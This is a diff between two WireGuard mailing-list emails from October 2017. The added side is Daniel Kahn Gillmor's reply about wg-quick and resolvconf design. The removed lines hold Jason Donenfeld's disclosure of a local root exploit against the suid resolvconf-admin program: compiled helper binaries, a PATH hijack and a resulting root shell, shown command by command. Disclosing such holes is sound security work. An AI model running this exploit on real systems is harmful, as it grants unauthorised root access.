@@ -1,23 +1,16 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: dkg@fifthhorseman.net
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 7daf64c5
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id c373d4c2
  for <wireguard@lists.zx2c4.com>;
- Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id adaf536d
+ Mon, 30 Oct 2017 12:14:18 +0000 (UTC)
+Received: from che.mayfirst.org (che.mayfirst.org [162.247.75.118])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 896baced
  for <wireguard@lists.zx2c4.com>;
- Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 70967b54
- for <wireguard@lists.zx2c4.com>;
- Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id 5e3d9282
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
- for <wireguard@lists.zx2c4.com>;
- Sun, 29 Oct 2017 22:04:24 +0000 (UTC)
-Received: by mail-oi0-f51.google.com with SMTP id n82so18456563oig.3
- for <wireguard@lists.zx2c4.com>; Sun, 29 Oct 2017 15:06:32 -0700 (PDT)
-MIME-Version: 1.0
-In-Reply-To: <87ineze3x2.fsf@fifthhorseman.net>
+ Mon, 30 Oct 2017 12:14:18 +0000 (UTC)
+From: Daniel Kahn Gillmor <dkg@fifthhorseman.net>
+To: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Subject: Re: Fixing wg-quick's DNS= directive with a hatchet
+In-Reply-To: <CAHmME9quj4hEy37B-+HgP1GZRjF__mZ6YGC3V+NDeGsH7JksKA@mail.gmail.com>
 References: <CAHmME9q0m1rEfc_CFsb3qv6oQ97QOjtPDxe6yY+D+0aAApE9Yg@mail.gmail.com>
  <3a761178-19bc-1d01-b6a8-9fb801312d47@solidadmin.com>
  <CAHmME9q3g3622k6C+pcvb_EpA9NdedTmmE59vohUR3nF3fyuvg@mail.gmail.com>
@@ -28,12 +21,12 @@ References: <CAHmME9q0m1rEfc_CFsb3qv6oQ97QOjtPDxe6yY+D+0aAApE9Yg@mail.gmail.com>
  <87she4fdol.fsf@fifthhorseman.net>
  <CAHmME9r0ji7bE4kzJ6964y8kzt061rUOLFKGfCJbpO19sTOMRw@mail.gmail.com>
  <87ineze3x2.fsf@fifthhorseman.net>
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Sun, 29 Oct 2017 23:06:31 +0100
-Message-ID: <CAHmME9rpVS84KzU4a76tKLPVQ0MfjegvQhLzrF6z=F5Um8128g@mail.gmail.com>
-Subject: Re: Fixing wg-quick's DNS= directive with a hatchet
-To: Daniel Kahn Gillmor <dkg@fifthhorseman.net>
-Content-Type: text/plain; charset="UTF-8"
+ <CAHmME9quj4hEy37B-+HgP1GZRjF__mZ6YGC3V+NDeGsH7JksKA@mail.gmail.com>
+Date: Mon, 30 Oct 2017 13:10:57 +0100
+Message-ID: <87lgjsdeem.fsf@fifthhorseman.net>
+MIME-Version: 1.0
+Content-Type: multipart/signed; boundary="=-=-=";
+ micalg=pgp-sha512; protocol="application/pgp-signature"
 Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
@@ -44,43 +37,56 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-On Sat, Oct 28, 2017 at 4:35 PM, Daniel Kahn Gillmor
-<dkg@fifthhorseman.net> wrote:
-> I actually shipped the resolvconf-admin package in debian to provide
-> some kind of filtering interface to avoid total garbage from the network
-> getting accidentally passed through to arbitrary resolvconf plugins.
+--=-=-=
+Content-Type: text/plain
 
-By the way, the program you wrote introduces a trivial local privilege
-escalation vulnerability into Debian, since not all available
-providers of the resolvconf binary set PATH themselves. Always clear
-environment variables yourself before exec'ing anything in an suid
-executable. Here's an exploit:
+On Sat 2017-10-28 20:57:06 +0200, Jason A. Donenfeld wrote:
+> 1) wg-quick isn't a daemon, though openvpn is.
 
-unpriv@scw-968260:~$ id
-uid=1000(unpriv) gid=1000(unpriv) groups=1000(unpriv),114(resolvconf-admins)
+wg-quick could be invoked from a network management daemon.  Part of the
+brilliance of wireguard is that the in-kernel stuff *doesn't* try to
+integrate fancy configuration/setup policy.  But that does mean that
+it's likely that there needs to be some user-space policy agent for
+system integration.
 
-unpriv@scw-968260:~$ stat /usr/bin/resolvconf-admin
-  File: /usr/bin/resolvconf-admin
-  Size: 24736           Blocks: 56         IO Block: 4096   regular file
-Device: fd00h/64768d    Inode: 2897743     Links: 1
-Access: (4754/-rwsr-xr--)  Uid: (    0/    root)   Gid: (
-114/resolvconf-admins)
-Access: 2017-10-29 21:56:25.709185001 +0000
-Modify: 2017-10-29 21:55:04.529185001 +0000
-Change: 2017-10-29 21:55:41.449185001 +0000
- Birth: -
+> 2) I can think of at least 5 ways to implement a resolvconf binary without
+> requiring root, making your argument moot. There's nothing inherent in the
+> resolvconf model that would require it.
+>
+> If you're interested in spending the time implementing this for openresolv,
+> I can spec those out in detail for you.
 
-unpriv@scw-968260:~$ echo 'main() { setuid(0); setgid(0);
-execl("/bin/sh", 0); }' > a.c && gcc -o rootshell a.c
+Please report these suggestions to openresolv or any other resolvconf
+implementations.  My point is about what exists today, not about what is
+theoretically possible.  This argument will be moot when any widely-used
+resolvconf implementation doesn't have to be executed as the superuser
+by default.  Please, make it moot! :)
 
-unpriv@scw-968260:~$ echo "main() { chown(\"$PWD/rootshell\", 0, 0);
-chmod(\"$PWD/rootshell\", 04755); }" > a.c && gcc -o mkdir a.c
+> Alternatively, you can just wait for the systemd devs to add a
+> resolvconf for controlling systemd-resolved, if that's the horse
+> you're betting on.
 
-unpriv@scw-968260:~$ export PATH="$PWD:$PATH"
+That'd be fine with me, thanks for pushing on it.
 
-unpriv@scw-968260:~$ resolvconf-admin add eth0 8.8.8.8
-Cannot write to /run/resolvconf/lock
+       --dkg
 
-unpriv@scw-968260:~$ ./rootshell
-# id
-uid=0(root) gid=0(root) groups=0(root),114(resolvconf-admins),1000(unpriv)
+--=-=-=
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCgAdFiEEOCdgUepHf6PklTkyFJitxsGSMjcFAln3FtEACgkQFJitxsGS
+MjeS+A/+IYyiFqGSpSyvWbbTPAQYqdy7IORqnf9TAS/o+qqVl9UMec0Uxpqg1vA6
+uMYGTVMen/PKnODgcn+pB/jNw7n8jjHg1bwZ8B2EN/pIP3Kz3uHNWaafH5wGekWz
+cfJchhGA8N/YURLxybWNY7Q49TzpQ3VTXv3roI9WPSzIMaDzzsnjfs8c5ApjtaKd
+LN/ezlRZlw3bU4xa3UvL0uh1eui3TdWBQ88u/idjj+in9mEgKDccKT1VgysCqTqB
+l9rILrtFcSjdOlBaDGt4nhuUeSvF+8RitsGRiDz/5E+8TG8fz4M2amD9tpvyVUFy
+aQKUIvCotDVKELh4mP47LE3eqNJFIHsJ3hy5KGkP8kYrCC6QySkhqyg8qBqgCD76
+P/SiZwhTAwUeGtMmaxiFAPIumZ7fWj9oiQ6jcBiBo1sa5SXrLX8wYMCOF8Tz4ACm
+KSuQTffm0osyndE1325vwksb2PXObhCcNaRY/oj1DycetBJg0/jZKdJoAbbzoSh2
+b17Aut5SixPncKn08roKGqx17OZlExIsIOBt65tbZg3yB4QxuOLKMid/aDWns7iF
+jdTKmt/ZYV51IevA7uSiE4IlmqTeaYretDO20bU9HkoFqt8ZkpnlbxrH6v1gTi3y
+e7lsLjmacxO6RD5am/BjO7K5hnfJydNrcOcgzyNwB8+qUXVsJBw=
+=FnRE
+-----END PGP SIGNATURE-----
+--=-=-=--
